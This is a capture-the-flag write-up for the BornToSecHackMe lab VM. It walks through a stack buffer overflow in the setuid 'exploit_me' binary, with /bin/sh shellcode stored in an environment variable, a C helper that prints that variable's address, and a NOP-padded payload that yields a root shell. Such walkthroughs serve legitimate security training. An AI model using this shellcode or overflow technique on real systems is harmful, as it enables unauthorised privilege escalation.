[See detailed writeup here](../writeup1.md)

This time we will exploit `**exploit_me**` in the zaz user with shellcode.

```
export shellcode=$'\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0
\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
```

When you search for "/bin/sh shellcode" on Google, this is one of the first results:

```
https://shell-storm.org/shellcode/files/shellcode-827.html
```

We copied the shellcode directly from there and put it into an environment variable.

We will use a simple C code to get the pointer address of this shellcode.

```
#include <stdio.h>
#include <stdlib.h>

int main(int ac, char **av)
{
        if (ac == 2)
        {
                char* ptr = getenv(av[1]);
                printf("%p\n", ptr);
        }
}
```

```
zaz@BornToSecHackMe:~$ gcc shellcode.c

zaz@BornToSecHackMe:~$ ./a.out shellcode
0xbffffef7
zaz@BornToSecHackMe:~$
```
Our second argument is the shellcode environment variable we added.

We just obtained the memory address and now we need to use it in little endian format.

```little endian = "\xf7\xfe\xff\xbf" ```


```
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "\x90" * 140 + "\xf7\xfe\xff\xbf"')
������������������������������������������������������������������������������������������������������������������������������������������������
# whoami
root
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
# exit

```

FINALLY WE ARE ROOT #4 ;D